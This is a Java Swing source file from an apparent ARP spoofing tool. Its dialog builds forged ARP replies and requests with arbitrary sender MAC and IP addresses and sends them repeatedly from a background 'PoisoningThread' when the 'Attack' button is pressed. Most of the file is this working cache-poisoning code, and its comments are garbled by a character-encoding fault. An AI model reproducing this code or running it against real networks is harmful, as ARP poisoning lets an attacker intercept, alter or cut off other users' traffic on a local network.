package UI;

import java.awt.BorderLayout;
import java.awt.FlowLayout;

import javax.swing.ButtonGroup;
import javax.swing.DefaultComboBoxModel;
import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;
import javax.swing.table.DefaultTableModel;
import javax.swing.text.AttributeSet;
import javax.swing.text.BadLocationException;
import javax.swing.text.PlainDocument;

import jpcap.JpcapSender;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import method.IPv4Convert;
import method.MACConvert;
import pcap.AdapterInfo;

import javax.swing.JComboBox;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JTextField;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.time.LocalDateTime;
import java.awt.event.ActionEvent;
import javax.swing.JRadioButton;
import java.awt.event.ItemListener;
import java.awt.event.ItemEvent;

@SuppressWarnings("serial")
public class CustomARPDialog extends JDialog {

	private MainUI mainui;// ����ʱ�������ߴ�������Ϊ��Ա����������ͼ�л�ȡ����������Ϣ
	private ARPPoisoningPanel poisoningPanel;

	private ARPPacket arp;

	private static String[] attackComboModelArray = new String[] { "Reply Unicast", "Reply Broadcast",
			"Request Unicast", "Request Broadcast" };

	private JpcapSender sender = null;
 
	private boolean limited = false;

	private static int defaultinterval = 1000;

	private final JPanel contentPanel = new JPanel();
	private JTextField dstIPTF;
	private JTextField arpDstMACTF;
	private JTextField srcIPTF;
	private JTextField arpSrcMACTF;
	private JTextField packetTF;
	private JTextField IntervalTF;

	private JComboBox<String> attackModeCombo;
	private DefaultComboBoxModel<String> attackComboModel;

	/**
	 * Launch the application.
	 */
	public static void main(String[] args) {
		try {
			MainUI ui = new MainUI();
			ui.setVisible(true);
			CustomARPDialog dialog = new CustomARPDialog(ui, MACConvert.LinkLayerBroadcastMAC, "74-e5-0b-3a-72-56",
					"74-e5-0b-3a-72-56", "00-00-00-00-00-00", "192.168.5.1");
			dialog.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
			dialog.setVisible(true);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * Create the dialog.
	 */
	ActionListener Attack = new ActionListener() {
		@Override
		public void actionPerformed(ActionEvent e) {

			boolean arpDst = arpDstMACTF.getText().matches(AdapterInfo.MACREGEX);
			boolean arpSrc = arpSrcMACTF.getText().matches(AdapterInfo.MACREGEX);
			boolean linkDst = linkDstMACTF.getText().matches(AdapterInfo.MACREGEX);
			boolean linkSrc = linkSrcMACTF.getText().matches(AdapterInfo.MACREGEX);
			boolean srcIP = srcIPTF.getText().matches(AdapterInfo.IPv4REGEXjb);
			boolean dstIP = dstIPTF.getText().matches(AdapterInfo.IPv4REGEXjb);
			if (!linkDst) {
				JOptionPane.showMessageDialog(null, "Link Dst MAC format wrong!");
				return;
			} else if (!arpDst) {
				JOptionPane.showMessageDialog(null, "ARP Dst MAC format wrong!");
				return;
			} else if (!dstIP) {
				JOptionPane.showMessageDialog(null, "Dst IP format wrong!");
				return;
			} else if (!linkSrc) {
				JOptionPane.showMessageDialog(null, "Link Src MAC format wrong!");
				return;
			} else if (!arpSrc) {
				JOptionPane.showMessageDialog(null, "ARP Src MAC format wrong!");
				return;
			} else if (!srcIP) {
				JOptionPane.showMessageDialog(null, "Src IP format wrong!");
				return;
			}

			new Thread(() -> {
				ARPPoisoningPanel localPoisoningPanel = mainui.getARPTabbed().getPoisoningPanel();

				try {
					sender = JpcapSender.openDevice(mainui.getAdapter().getSelectedadapter());
				} catch (IOException e2) {
					// TODO Auto-generated catch block
					e2.printStackTrace();
				}

				switch (attackModeCombo.getSelectedIndex()) {// ��������
				case 0:
					arp = genReplyUnicastARPPacket(linkSrcMACTF.getText(), arpSrcMACTF.getText(), srcIPTF.getText(),
							linkDstMACTF.getText(), arpDstMACTF.getText(), dstIPTF.getText());
					break;
				case 1:
					arp = genReplyBroadcastARPPacket(linkSrcMACTF.getText(), arpSrcMACTF.getText(), srcIPTF.getText(),
							arpDstMACTF.getText(), dstIPTF.getText());
					break;
				case 2:
					arp = genRequestUnicastARPPacket(linkSrcMACTF.getText(), arpSrcMACTF.getText(), srcIPTF.getText(),
							linkDstMACTF.getText(), arpDstMACTF.getText(), dstIPTF.getText());
					break;
				case 3:
					arp = genRequestBroadcastARPPacket(linkSrcMACTF.getText(), arpSrcMACTF.getText(), srcIPTF.getText(),
							arpDstMACTF.getText(), dstIPTF.getText());
					break;
				default:
					arp = null;
				}

				// ����poisoning��ͼ

				final DefaultTableModel localPoiModel = localPoisoningPanel.getPoiTableModel();
				String[] renew = new String[ARPPoisoningPanel.poiTableModelArrayLen];
				String hostName = "";
				try {
					InetAddress target = InetAddress.getByName(dstIPTF.getText());
					hostName = target.getHostName();
				} catch (UnknownHostException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}

				renew[0] = String.valueOf(localPoiModel.getRowCount() + 1);
				renew[1] = String.valueOf(localPoisoningPanel.addSequence());
				renew[2] = mainui.getAdapter().getAdaptername();
				renew[3] = hostName;
				renew[4] = linkDstMACTF.getText();
				renew[5] = linkSrcMACTF.getText();
				renew[6] = arpSrcMACTF.getText();
				renew[7] = srcIPTF.getText();
				renew[8] = arpDstMACTF.getText();
				renew[9] = dstIPTF.getText();
				String time = LocalDateTime.now().toString();
				renew[10] = time.substring(0, time.lastIndexOf("."));// ��.�������ĺ���ȥ��������ҿ����ұߵ�������������.
				renew[11] = attackModeCombo.getSelectedItem().toString();
				renew[12] = IntervalTF.getText() + "ms";
				if (packetTF.isEnabled()) {
					renew[13] = packetTF.getText();
				} else {
					renew[13] = "Unlimited";
				}
				renew[14] = "0";
				renew[15] = "";
				localPoiModel.addRow(renew);// �������������������Table
				// ����ARP�̲߳�����
				PoisoningThread p;
				if (packetTF.isEnabled()) {
					p = new PoisoningThread(limited, sender, arp, poisoningPanel, Integer.valueOf(IntervalTF.getText()),
							Integer.valueOf(packetTF.getText()));
				} else {
					p = new PoisoningThread(limited, sender, arp, poisoningPanel, Integer.valueOf(IntervalTF.getText()),
							0);
				}

				poisoningPanel.getThreadlist().add(p);
				p.start();

			}).start();
		}
	};

	private JRadioButton rdbtnLimited;

	private JRadioButton rdbtnUnlimited;

	private JLabel SelectedAdapterLabel;

	private JPanel buttonPanel;

	private JButton attackButton;

	private JButton exitButton;

	private JLabel attackModeLabel;
	private JTextField linkDstMACTF;
	private JTextField linkSrcMACTF;

	public CustomARPDialog(MainUI mainui, String linkDstMAC, String linkSrcMAC, String ARPSrcMAC, String ARPDstMAC,
			String dstIP) {
		this.mainui = mainui;
		this.poisoningPanel = mainui.getARPTabbed().getPoisoningPanel();

		// Dialog
		setBounds(100, 100, 485, 305);
		getContentPane().setLayout(new BorderLayout());
		contentPanel.setBorder(new EmptyBorder(5, 5, 5, 5));
		getContentPane().add(contentPanel, BorderLayout.CENTER);
		contentPanel.setLayout(null);
		setResizable(false);

		// comboBox Model
		this.attackComboModel = new DefaultComboBoxModel<String>(attackComboModelArray);

		// modeCombo
		this.attackModeCombo = new JComboBox<String>(attackComboModel);
		attackModeCombo.addItemListener(new ItemListener() {
			public void itemStateChanged(ItemEvent e) {
				if (attackModeCombo.getSelectedIndex() == 1 || attackModeCombo.getSelectedIndex() == 3) {
					linkDstMACTF.setText(MACConvert.LinkLayerBroadcastMAC);
					arpDstMACTF.setText(MACConvert.ARPLayerBroadcastMAC);
					dstIPTF.setText(IPv4Convert.ARPLayerBroadcastIP);
					linkDstMACTF.setEnabled(false);
				} else {
					linkDstMACTF.setEnabled(true);
					linkDstMACTF.setText(linkDstMAC);
					arpDstMACTF.setText(ARPDstMAC);
					dstIPTF.setText(dstIP);
				}
			}
		});
		attackModeCombo.setBounds(322, 162, 135, 21);
		attackModeCombo.setSelectedIndex(0);
		contentPanel.add(attackModeCombo);

		// attackModel Label
		attackModeLabel = new JLabel("Attack Mode");
		attackModeLabel.setBounds(322, 137, 111, 15);
		contentPanel.add(attackModeLabel);

		// dstIP Label
		JLabel dstIpLabel = new JLabel("ARP Dst IP");
		dstIpLabel.setBounds(324, 10, 99, 15);
		contentPanel.add(dstIpLabel);

		// dstIP TF
		dstIPTF = new JTextField(dstIP);
		dstIPTF.setBounds(324, 35, 99, 21);
		contentPanel.add(dstIPTF);

		// arpDstMAC TF
		arpDstMACTF = new JTextField();
		arpDstMACTF.setText(ARPDstMAC);
		arpDstMACTF.setBounds(167, 35, 111, 21);
		contentPanel.add(arpDstMACTF);

		// srcIP Label
		JLabel SrcIPLabel = new JLabel("ARP Src IP");
		SrcIPLabel.setBounds(324, 66, 99, 15);
		contentPanel.add(SrcIPLabel);
		
				// dstMAC Label
				JLabel DstMacLabel = new JLabel("ARP Dst MAC");
				DstMacLabel.setBounds(167, 10, 111, 15);
				contentPanel.add(DstMacLabel);

		// srcIP TF
		srcIPTF = new JTextField();
		srcIPTF.setBounds(324, 91, 99, 21);
		contentPanel.add(srcIPTF);

		// srcMAC Label
		JLabel SrcMACLabel = new JLabel("ARP Src MAC");
		SrcMACLabel.setBounds(167, 66, 111, 15);
		contentPanel.add(SrcMACLabel);

		// srcMAC TF
		arpSrcMACTF = new JTextField(ARPSrcMAC);
		arpSrcMACTF.setBounds(167, 91, 111, 21);
		contentPanel.add(arpSrcMACTF);

		// interval Label
		JLabel lblInterval = new JLabel("Send Interval(ms)");
		lblInterval.setBounds(167, 137, 111, 15);
		contentPanel.add(lblInterval);

		// packet TextField
		packetTF = new JTextField();
		packetTF.setDocument(new PlainDocument() {
			@Override
			public void insertString(int offs, String str, AttributeSet a) throws BadLocationException {
				// TODO Auto-generated method stub
				if (a != null) {
					// ʹ���������뷨����Ӣ����ĸ(��ʱ��ĸ)ʱ,a����Ϊnull,��ʹ�����뷨��������ʱa��Ϊnull
					// System.out.println(a);
					// System.out.println(str);
					return;
				}
				if (str.matches("\\d+")) {
					super.insertString(offs, str, a);
				}
			}
		});
		packetTF.setEnabled(false);
		packetTF.setBounds(10, 212, 111, 21);
		contentPanel.add(packetTF);
		packetTF.setColumns(10);

		JLabel lblPacketNumber = new JLabel("Packet Number");
		lblPacketNumber.setBounds(10, 187, 111, 15);
		contentPanel.add(lblPacketNumber);

		// limited button
		rdbtnLimited = new JRadioButton("Limited");
		rdbtnLimited.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				packetTF.setEnabled(true);
				limited = true;
			}
		});
		rdbtnLimited.setBounds(10, 137, 111, 15);
		contentPanel.add(rdbtnLimited);

		// unlimited button
		rdbtnUnlimited = new JRadioButton("Unlimited");
		rdbtnUnlimited.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				packetTF.setEnabled(false);
				limited = false;
			}
		});
		rdbtnUnlimited.setBounds(10, 162, 111, 15);
		rdbtnUnlimited.setSelected(true);
		contentPanel.add(rdbtnUnlimited);

		// button Group
		ButtonGroup buttonGroup = new ButtonGroup();
		buttonGroup.add(rdbtnUnlimited);// ��ť��
		buttonGroup.add(rdbtnLimited);

		// new DefaultStyledDocument() Interval TF
		IntervalTF = new JTextField(new PlainDocument() {
			@Override
			public void insertString(int offs, String str, AttributeSet a) throws BadLocationException {
				if (a != null) {
					return;
				}
				if (str.matches("\\d+")) {
					super.insertString(offs, str, a);
				}
			}
		}, "", 0);
		IntervalTF.setText(String.valueOf(defaultinterval));
		IntervalTF.setBounds(167, 162, 123, 21);
		contentPanel.add(IntervalTF);
		IntervalTF.setColumns(10);

		// selectedAdapter Label
		SelectedAdapterLabel = new JLabel();// mainui.getAdapter().getLocaldesc()
		SelectedAdapterLabel.setBounds(301, 197, 123, 21);
		contentPanel.add(SelectedAdapterLabel);

		// linkDstMAC Label
		JLabel lblLinkDstMac = new JLabel("Link Dst MAC");
		lblLinkDstMac.setBounds(10, 10, 111, 15);
		contentPanel.add(lblLinkDstMac);

		// linkDstMAC TF
		linkDstMACTF = new JTextField(linkDstMAC);
		linkDstMACTF.setBounds(10, 35, 111, 21);
		contentPanel.add(linkDstMACTF);
		linkDstMACTF.setColumns(10);

		// linkSrcMAC Label
		JLabel lblLinkSrcMac = new JLabel("Link Src MAC");
		lblLinkSrcMac.setBounds(10, 66, 111, 15);
		contentPanel.add(lblLinkSrcMac);

		// linkSrcMAC TF
		linkSrcMACTF = new JTextField(linkSrcMAC);
		linkSrcMACTF.setBounds(10, 91, 111, 21);
		contentPanel.add(linkSrcMACTF);
		linkSrcMACTF.setColumns(10);

		// attack Button
		attackButton = new JButton("Attack");
		attackButton.addActionListener(Attack);
		getRootPane().setDefaultButton(attackButton);

		// exit Button
		exitButton = new JButton("Exit");
		exitButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				dispose();
			}
		});
		exitButton.setActionCommand("Cancel");

		// button Panel
		buttonPanel = new JPanel();
		buttonPanel.setLayout(new FlowLayout(FlowLayout.RIGHT));
		buttonPanel.add(attackButton);
		buttonPanel.add(exitButton);
		getContentPane().add(buttonPanel, BorderLayout.SOUTH);

	}

	/**
	 * @wbp.parser.constructor
	 */
	public CustomARPDialog(MainUI mainui) {
		// TODO Auto-generated constructor stub
		this(mainui, "", "", "", "", "");
	}

	private static ARPPacket genReplyUnicastARPPacket(String linkSrcMAC, String arpSrcMAC, String srcIP,
			String linkDstMAC, String arpDstMAC, String dstIP) {
		ARPPacket arppacket = new ARPPacket(); // ����ARP��
		EthernetPacket etherpacket = new EthernetPacket(); // ������̫���ײ�

		// ����㱨��
		arppacket.hardtype = ARPPacket.HARDTYPE_ETHER; // Ӳ������ ��̫��2
		arppacket.prototype = ARPPacket.PROTOTYPE_IP; // Э������
		arppacket.hlen = 6; // Ӳ����ַ����
		arppacket.plen = 4; // Э�����ͳ���
		arppacket.operation = ARPPacket.ARP_REPLY;// ��Ӧ����
		arppacket.sender_hardaddr = MACConvert.sToMAC(arpSrcMAC); // ���Ͷ�MAC��ַ
		arppacket.sender_protoaddr = method.IPv4Convert.strToBytes(srcIP);// ���Ͷ�IP��ַ
		arppacket.target_hardaddr = MACConvert.sToMAC(arpDstMAC); // Ŀ��Ӳ����ַ
		arppacket.target_protoaddr = method.IPv4Convert.strToBytes(dstIP); // Ŀ��IP��ַ

		// ������·�㱨��
		etherpacket.dst_mac = MACConvert.sToMAC(linkDstMAC); // Ŀ��MAC��ַ
		etherpacket.src_mac = MACConvert.sToMAC(linkSrcMAC); // ԴMAC��ַ
		etherpacket.frametype = EthernetPacket.ETHERTYPE_ARP; // ����֡������ΪARP֡

		arppacket.datalink = etherpacket; // ���

		return arppacket;
	}

	private static ARPPacket genReplyBroadcastARPPacket(String linkSrcMAC, String arpSrcMAC, String srcIP,
			String arpDstMAC, String dstIP) {
		ARPPacket arppacket = new ARPPacket(); // ����ARP��
		EthernetPacket etherpacket = new EthernetPacket(); // ������̫���ײ�

		// ����㱨��
		arppacket.hardtype = ARPPacket.HARDTYPE_ETHER; // Ӳ������ ��̫��2
		arppacket.prototype = ARPPacket.PROTOTYPE_IP; // Э������
		arppacket.hlen = 6; // Ӳ����ַ����
		arppacket.plen = 4; // Э�����ͳ���
		arppacket.operation = ARPPacket.ARP_REPLY;// ��Ӧ����
		arppacket.sender_hardaddr = MACConvert.sToMAC(arpSrcMAC); // ���Ͷ�MAC��ַ
		arppacket.sender_protoaddr = method.IPv4Convert.strToBytes(srcIP);// ���Ͷ�IP��ַ
		arppacket.target_hardaddr = MACConvert.sToMAC(arpDstMAC); // Ŀ��Ӳ����ַ ��׼Ϊ00-00-00,���Զ���Ҳ�������
		arppacket.target_protoaddr = method.IPv4Convert.strToBytes(dstIP); // Ŀ��IP��ַ

		// ������·�㱨��
		etherpacket.dst_mac = MACConvert.sToMAC("ff-ff-ff-ff-ff-ff"); // Ŀ��MAC��ַ
		etherpacket.src_mac = MACConvert.sToMAC(linkSrcMAC); // ԴMAC��ַ
		etherpacket.frametype = EthernetPacket.ETHERTYPE_ARP; // ����֡������ΪARP֡

		arppacket.datalink = etherpacket; // ���

		return arppacket;
	}

	private static ARPPacket genRequestUnicastARPPacket(String linkSrcMAC, String arpSrcMAC, String srcIP,
			String linkDstMAC, String arpDstMAC, String dstIP) {
		ARPPacket arppacket = new ARPPacket(); // ����ARP��
		EthernetPacket etherpacket = new EthernetPacket(); // ������̫���ײ�

		// ����㱨��
		arppacket.hardtype = ARPPacket.HARDTYPE_ETHER; // Ӳ������ ��̫��2
		arppacket.prototype = ARPPacket.PROTOTYPE_IP; // Э������
		arppacket.hlen = 6; // Ӳ����ַ����
		arppacket.plen = 4; // Э�����ͳ���
		arppacket.operation = ARPPacket.ARP_REQUEST;// ��Ӧ����
		arppacket.sender_hardaddr = MACConvert.sToMAC(arpSrcMAC); // ���Ͷ�MAC��ַ
		arppacket.sender_protoaddr = method.IPv4Convert.strToBytes(srcIP);// ���Ͷ�IP��ַ
		arppacket.target_hardaddr = MACConvert.sToMAC(arpDstMAC); // Ŀ��Ӳ����ַ
		arppacket.target_protoaddr = method.IPv4Convert.strToBytes(dstIP); // Ŀ��IP��ַ

		// ������·�㱨��
		etherpacket.dst_mac = MACConvert.sToMAC(linkDstMAC); // Ŀ��MAC��ַ
		etherpacket.src_mac = MACConvert.sToMAC(linkSrcMAC); // ԴMAC��ַ
		etherpacket.frametype = EthernetPacket.ETHERTYPE_ARP; // ����֡������ΪARP֡

		arppacket.datalink = etherpacket; // ���

		return arppacket;
	}

	private static ARPPacket genRequestBroadcastARPPacket(String linkSrcMAC, String arpSrcMAC, String srcIP,
			String arpDstMAC, String dstIP) {
		ARPPacket arppacket = new ARPPacket(); // ����ARP��
		EthernetPacket etherpacket = new EthernetPacket(); // ������̫���ײ�

		// ����㱨��
		arppacket.hardtype = ARPPacket.HARDTYPE_ETHER; // Ӳ������ ��̫��2
		arppacket.prototype = ARPPacket.PROTOTYPE_IP; // Э������
		arppacket.hlen = 6; // Ӳ����ַ����
		arppacket.plen = 4; // Э�����ͳ���
		arppacket.operation = ARPPacket.ARP_REQUEST;// ��Ӧ����
		arppacket.sender_hardaddr = MACConvert.sToMAC(arpSrcMAC); // ���Ͷ�MAC��ַ
		arppacket.sender_protoaddr = method.IPv4Convert.strToBytes(srcIP);// ���Ͷ�IP��ַ
		arppacket.target_hardaddr = MACConvert.sToMAC(arpDstMAC); // Ŀ��Ӳ����ַ
		arppacket.target_protoaddr = method.IPv4Convert.strToBytes(dstIP); // Ŀ��IP��ַ

		// ������·�㱨��
		etherpacket.dst_mac = MACConvert.sToMAC("ff-ff-ff-ff-ff-ff"); // Ŀ��MAC��ַ
		etherpacket.src_mac = MACConvert.sToMAC(linkSrcMAC); // ԴMAC��ַ
		etherpacket.frametype = EthernetPacket.ETHERTYPE_ARP; // ����֡������ΪARP֡

		arppacket.datalink = etherpacket; // ���

		return arppacket;
	}

	static class PoisoningThread extends Thread {

		private boolean limited;
		private volatile boolean stop;
		private volatile boolean end;

		private JpcapSender sender;
		private ARPPacket arp;

		private ARPPoisoningPanel poisoningPanel;
		private DefaultTableModel localPoiModel;
		private int attackInterval;
		private int maxPackages;
		private int row;

		@Override
		public void run() {
			// TODO Auto-generated method stub
			while (!end) {
				if (!limited) {
					int packets = 0;
					while (!stop && !end) {
						sender.sendPacket(arp);
						localPoiModel.setValueAt(Integer.valueOf(++packets), row, ARPPoisoningPanel.SentPackagesColumn);
						// ����: ��Ԫ����������ڶ�β�����ͨ�����¶�βԪ�ؿ���ʵ�� ����Ϊʲô������row -1��������row?
						// ����: ���һ�е�Ԫ���Ƿ��͵����ݰ�����,����ҿ�ԭ����Ҫ-1
						if (Integer.valueOf(localPoiModel.getValueAt(row, 0).toString()) != (row + 1)) {
							// cease��Ķ�rowֵ��rowֵ������쳣�����ԾͿ����е�Number�Ƿ��Ǹ��е�����+1
							localPoiModel.setValueAt(Integer.valueOf(row + 1), row, 0);
						}
						try {
							Thread.sleep(attackInterval);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
					}
				} else {
					for (int i = 0; i < maxPackages && !stop && !end; i++) {
						sender.sendPacket(arp);
						localPoiModel.setValueAt(Integer.valueOf(i + 1), row, ARPPoisoningPanel.SentPackagesColumn);
						// ����: ��Ԫ����������ڶ�β�����ͨ�����¶�βԪ�ؿ���ʵ��
						// ����: ���һ�е�Ԫ���Ƿ��͵����ݰ�����
						if (Integer.valueOf(localPoiModel.getValueAt(row, 0).toString()) != (row + 1)) {
							// cease��Ķ�rowֵ��rowֵ������쳣�����ԾͿ����е�Number�Ƿ��Ǹ��е�����+1
							localPoiModel.setValueAt(Integer.valueOf(row + 1), row, 0);
						}
						try {
							Thread.sleep(attackInterval);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
					}
				}
			}
		}

		public PoisoningThread(boolean limited, JpcapSender sender, ARPPacket arp, ARPPoisoningPanel poisoningPanel,
				int attackInterval, int maxPackages) {
			super();
			this.limited = limited;
			this.sender = sender;
			this.arp = arp;
			this.attackInterval = attackInterval;
			this.maxPackages = maxPackages;
			this.stop = false;
			this.end = false;
			this.poisoningPanel = poisoningPanel;
			this.localPoiModel = this.poisoningPanel.getPoiTableModel();
			this.row = localPoiModel.getRowCount() - 1;
			// ��Ϊ���ȸ��µ���ͼ���ڴ����߳�ǰ�����߳��Ѿ�����ͼ�ϴ����ˣ�����ҪҪ-1
			// ����Ѹ�����ͼ���ڴ����߳�֮����ô������-1
			// �����ȸ�����ͼ�ٴ����̣߳�����ΪARP�̵߳����񲻹��ǳ�������ARP���ģ����и�����ͼ��sent
			// Packages���������������ͼ���ȰѸ��̶߳�Ӧ��һ�д�������������ȫ�޷�������ͼ
		}

		public void setStop() {
			this.stop = true;
		}

		public void setStart() {
			this.stop = false;
		}

		public boolean getStop() {
			return this.stop;
		}

		public void setRow(int row) {
			this.row = row;
		}

		public int getRow() {
			return this.row;
		}

		public void end() {
			this.end = true;
		}

	}
}
